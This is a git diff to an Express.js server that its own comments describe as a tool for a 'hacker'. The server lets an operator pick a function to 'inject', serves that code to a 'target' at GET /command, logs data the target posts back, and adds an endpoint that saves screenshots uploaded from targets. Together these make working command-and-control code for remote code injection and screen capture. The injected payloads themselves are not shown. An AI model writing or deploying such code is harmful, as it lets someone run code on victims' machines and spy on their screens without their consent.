@@ -1,6 +1,19 @@
 const express = require('express')
 const app = express()
 const cors = require('cors')
+
+const multer  = require('multer')
+var storage = multer.diskStorage({
+  destination: function (req, file, cb) {
+    cb(null, 'screenshots/')
+  },
+  filename: function (req, file, cb) {
+    cb(null, Date.now() + '.jpg') //Appending .jpg
+  }
+})
+
+const upload = multer({ dest: 'screenshots/', storage: storage })
+
 const utils = require('./utilities.js')
 
 const util_descriptions = require('./utilities.js')
@@ -19,7 +32,6 @@ app.use(express.urlencoded())
 
 // By default, activate with first function
 const activeFuncs = {
-  "index": 0,
   "function": utils[0].func.toString(),
 }
 
@@ -35,35 +47,37 @@ app.get('/utils', (req, res) => {
 
 // Sets the index of the function that hacker wantes to inject
 app.post('/utils', (req, res) => {
-  const index = req.body.index;
-  if(index < 0 || index >= utils.length){
+  const index = parseInt(req.body.index);
+  if (index < 0 || index >= utils.length) {
     res.send("Wrong index...");
   }
-  else{
+  else {
     activeFuncs.function = utils[index].func.toString();
-    activeFuncs.index = index;
     res.send("Function injected");
   }
 })
 
 // Sends the code to be injected to the "target"
 app.get('/command', (req, res) => {
-  if(activeFuncs.function !== null){
+  if (activeFuncs.function !== null) {
     res.send(activeFuncs)
   }
 })
 
-// Dummy command for future use
 app.post('/command', (req, res) => {
   console.log(req.body)
+  res.send('Got a POST request')
+})
+
+app.post('/screenshots', upload.single("screenshot"), function (req, res, next) {
+  // req.file is the `avatar` file
+  // req.body will hold the text fields, if there were any
   res.send('Got a POST request')
 })
 
 app.listen(port, () => {
   console.log(`Example app listening on port ${port}`)
 })
-
-
 
 
 // Get UI related files - images, html, css, js, ttf
